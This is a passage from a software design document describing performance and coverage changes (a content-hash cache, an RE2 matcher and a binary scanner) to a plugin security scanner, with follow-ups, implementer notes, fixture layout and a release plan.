| TRDD-a4260cc6 (v2.100.1 context-aware skillaudit matcher) | completed | Defines the per-file-type context classifiers that this TRDD's cached results must preserve byte-for-byte. The parity test T29 replays a baseline built AFTER context classification, so any cache hit must already include the classifier's demote/keep decisions. |
| TRDD-94e06820 (body-tool consistency) | (resolve via repo) | Orthogonal — body-tool consistency is about agent output formatting, not scanner internals. No interaction. |
| TRDD-4de479a0 (migrate menus to claude-menu-system) | (resolve via repo) | Orthogonal — menu migration is about user-facing entry points, not scanner internals. No interaction. |
| TRDD-71e68ab5 (v2.91.0 batch-fix parallel sharding) | in-progress | Composes cleanly. The per-plugin validator each shard fixer invokes will now be 50× faster on a repeat run. The outer batch fan-out architecture is unchanged. |
| TRDD-f9c50038 (v2.99.1 pre-install scan + skillaudit calibration) | completed | The mandatory in-process Check 27 calls `cpv_skillaudit_native.scan_content` / `scan_path`. After this TRDD lands, those calls transparently hit the cache + RE2 matcher + binary scanner. No call-site change. |
| (v2.103.0 parallelism work, no single TRDD) | completed | This TRDD's three wins layer ON TOP of v2.103.0's ProcessPoolExecutor fan-out. The cache check happens BEFORE the worker is dispatched (eliminating per-worker spawn cost on a cache hit). RE2.Set works inside the worker. Binary scanner works inside the worker. |

This TRDD does NOT block any other TRDD. It is purely additive
performance + coverage. No external API changes, no removal of any
existing code path. A failed import of any of the three new modules
degrades gracefully to v2.103.0 behaviour for that feature.

## Follow-ups

| # | Follow-up | Why deferred |
|---|---|---|
| F1 | Stego scanning (LSB image analysis, etc.) | Format-specific codecs; empirical zero real-world incidents so far; would dramatically expand the test surface for marginal coverage gain. |
| F2 | Upgrade RE2.Set → RE2.RegexSet (newer API) when google-re2 ≥ 2.0 lands | Current API is stable and works; no need to chase a moving target. |
| F3 | Persistent scanner daemon (à la mypy daemon) | The cache already wins 95 % of the daemon's perf benefit; deployment complexity is high. Revisit if benchmarks show > 0.5 s residual cold-start cost. |
| F4 | Rust extension for the hottest matcher loops | Build-toolchain complexity (cibuildwheel, manylinux, macOS arm64) is high; the RE2 win already gets us to "fast enough". Revisit if a profile shows RE2 is the bottleneck. |
| F5 | Cross-machine cache sharing via S3 / GHA-cache backend | The local cache + per-runner GHA-cache step already covers the CI hot path. S3 sharing is for very large monorepos; out of scope for v2.104.0. |
| F6 | Auto-tune `max_intermediate_bytes` / `max_depth` based on observed catalog | Constants are conservative; auto-tuning is a future optimisation only justified if telemetry shows the limits being hit. |
| F7 | RE2 compile-time caching across processes | Each worker compiles RE2.Set once at import time (~80 ms). Shared-memory caching would save ~80 ms × (worker count - 1); marginal. |
| F8 | `cpv_doctor` actionable suggestion when `re2_compatibility.json` is > 6 months old | The publish gate catches mismatches; advisory only. |

## Cross-references

- `skills/canonical-pipeline/references/scan-cache.md` (NEW — full
  end-user doc for the cache, including troubleshooting,
  per-environment setup, and how to clear)
- `skills/canonical-pipeline/references/binary-scanning.md` (NEW —
  end-user doc for binary scanning, including supported formats,
  decode-chain limits, and the never-skip principle)
- `skills/canonical-pipeline/references/parallelism.md` (MODIFIED —
  adds §Content-hash cache, §Binary scanning, §RE2 hybrid matcher
  at the END of the file before §See also)
- `scripts/cpv_skillaudit_native.py` — host module the lazy imports
  land in
- `scripts/cpv_install_scanners.py` — adds the optional google-re2
  install
- `scripts/publish.py` — adds Gate 9c for catalog/audit hash parity
- `pyproject.toml` — adds `[performance]` extra
- TRDD-a4260cc6 — prior art for the context classifier whose decisions
  must be cached
- TRDD-71e68ab5 — prior art for the batch-fix sharding this composes
  with
- TRDD-f9c50038 — prior art for the mandatory Check 27 the cache
  transparently accelerates

## Implementer notes

### Pickleability under ProcessPool

`SkillAuditScanResult` is already a `@dataclass` of primitive fields
plus `list[SkillAuditFinding]` (also `@dataclass`). Both are pickleable
at `protocol=4`. The cache stores `pickle.dumps(result, protocol=4)`
to insulate against object-graph changes between pickle versions.

The `HybridMatcher` instance MUST NOT cross worker boundaries.
RE2.Set objects own a native handle and pickle behaviour is
implementation-defined. Instead, every worker imports
`cpv_re2_matcher` afresh and constructs its own `HybridMatcher` from
the same `_compiled_patterns` list (which IS pickleable). The
compilation cost (~80 ms) amortises over the worker's lifetime.

### Lazy import discipline

The three new modules MUST be imported only inside `scan_content` /
`scan_path` function bodies, NEVER at the top of
`cpv_skillaudit_native.py`. Reasons:

1. Failure modes must be per-feature, not all-or-nothing. A missing
   `google-re2` should NOT also disable the cache.
2. Static analysers (pyright, ruff) following the lazy-import path
   correctly mark each as Optional, matching the runtime behaviour.
3. The plug-and-play pattern matches `cpv_pre_install_scan` (lazy-imported by `validate_plugin.py`) and `cpv_marketplace_input`
   (lazy-imported by every batch script).

Anti-pattern to avoid:

```python
# WRONG — top-level import fails the whole module if google-re2 missing
from cpv_re2_matcher import HybridMatcher
```

Correct:

```python
# RIGHT — lazy import inside the function body, isolated try/except
def scan_content(text: str, file_path: Path, ...) -> SkillAuditScanResult:
    try:
        from cpv_re2_matcher import HybridMatcher
        matcher = HybridMatcher(_compiled_patterns)
    except ImportError:
        matcher = None
```

### Env-var-driven defaults

Every env var listed in the design follows the same convention:

- `CPV_<FEATURE>_DISABLED` = `0` / unset → feature on
- `CPV_<FEATURE>_DISABLED` = `1` → feature off, graceful degradation

This matches the existing `CPV_*_PARALLEL` knob style documented in
`parallelism.md`. NEVER add a knob that disables coverage silently;
every knob is documented and surfaces in `cpv_doctor.py`'s status
output.

### Test fixture layout

```
tests/fixtures/skillaudit_samples/
    text/            — pre-existing text-mode fixtures
    binary/          — NEW
        png_with_payload.png
        zip_with_comment.zip
        wasm_with_data.wasm
        utf16_le_command.bin
        base64_nested_depth2.bin
        decode_bomb_50mb.bin
    parity_baseline.json — recorded v2.103.0 finding set, regenerated
                           per release
```

The `decode_bomb_50mb.bin` fixture exists to prove T19 (decode-bomb
defuse). It is checked in as a generated artefact via a tiny
`scripts/_gen_decode_bomb_fixture.py` so the actual 50 MB file does
not bloat the repo — instead a 10 KB seed expands to 50 MB on
import-time generation.

### Concurrency budget

Three new threads-of-work are added per file scan in the worst case
(cache lookup, RE2.Set search, binary string extraction). All three
are CPU-bound and run inside the existing per-worker process — no
new processes, no new threads. The wall-clock improvement is from
work avoidance (cache hit) or work compression (RE2.Set), NOT from
new parallelism layers. The v2.103.0 fan-out remains the only
parallelism layer.

### Backward-compatibility surface

| Caller | Pre-v2.104.0 behaviour | Post-v2.104.0 behaviour |
|---|---|---|
| `validate_security.py` Check 27 | calls `scan_path(file)` | calls `scan_path(file)` — unchanged signature |
| `cpv_pre_install_scan.py` | calls `scan_content(text, path)` | calls `scan_content(text, path)` — unchanged signature |
| External plugin authors using `cpv_skillaudit_native` programmatically | gets `SkillAuditScanResult` | gets `SkillAuditScanResult` — same dataclass shape; new `binary_origin` field on `SkillAuditFinding` has `default=False` |
| CLI consumers (`validate_plugin .`) | sees same severity rollup | sees same severity rollup, plus optional `cache-hit-rate` line in `--verbose` mode |

No removal of any public function. No rename. No reshuffling of
return types.

### Release sequencing

The v2.104.0 release MUST land all three modules + the integration in
one PR. Partial landings are unsafe because:

- Landing scan-cache without the matcher means the cache stores
  Python-re results and a subsequent matcher landing would invalidate
  them (acceptable, but wastes a release).
- Landing binary-scanner without the matcher would scan binaries
  through the slow per-pattern loop (acceptable, but bad benchmark
  numbers for the release notes).
- Landing matcher without the cache means the cold-run win is
  visible but the warm-run win is not, which dilutes the user-facing
  story.

Recommended commit order INSIDE the PR (each commit individually
green):

1. `feat(scan-cache): add cpv_scan_cache module + tests T01-T11`
2. `feat(binary-scanner): add cpv_binary_scanner module + tests T12-T22`
3. `feat(re2): add cpv_re2_matcher module + re2_compatibility.json + tests T23-T28`
4. `feat(skillaudit): wire all three modules into cpv_skillaudit_native via lazy imports + tests T29-T32`
5. `feat(install): make google-re2 a non-blocking optional install + [performance] extra`
6. `feat(scaffold): add actions/cache@v4 step to ci.yml template`
7. `feat(publish): add Gate 9c catalog-hash parity check`
8. `docs(parallelism): add §Content-hash cache + §Binary scanning + §RE2 hybrid matcher (Part B of this TRDD)`
9. `docs(scan-cache): add scan-cache.md reference doc`
10. `docs(binary-scanning): add binary-scanning.md reference doc`
11. `release: bump to v2.104.0 and update CHANGELOG`

The main session bumps `status: not-started` → `status: in-progress`
on the first commit, and → `status: completed` on the release
commit (commit 11 above). On failure at any stage, `status` becomes
`failed` and a post-mortem section is appended to this TRDD body
BEFORE the file is committed in the failed state.

## Approval log

- 2026-08-25T17:25:14+0200 — CLOSED as complete by the CPV session (board drain; authority delegated by USER 2026-08-25). SHIPPED v2.104.2 commit 429ecf74 (batch_ad)
